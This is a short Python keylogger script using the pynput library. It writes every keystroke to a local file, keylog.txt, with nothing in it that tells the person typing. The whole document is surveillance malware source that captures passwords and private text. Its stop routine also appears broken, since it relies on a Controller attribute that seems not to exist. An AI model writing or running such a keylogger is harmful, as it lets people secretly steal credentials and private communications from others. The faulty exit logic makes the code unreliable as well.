from pynput import keyboard

# Path to the log file
log_file = "keylog.txt"

# Function to write keystrokes to the log file
def on_press(key):
    with open(log_file, "a") as f:
        f.write(f"{key}\n")

# Function to stop the keylogger
def on_release(key):
    # Stop the keylogger when 'Ctrl + C' is pressed
    if key == keyboard.KeyCode.from_char('c') and keyboard.Controller().ctrl_pressed:
        return False

# Setting up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

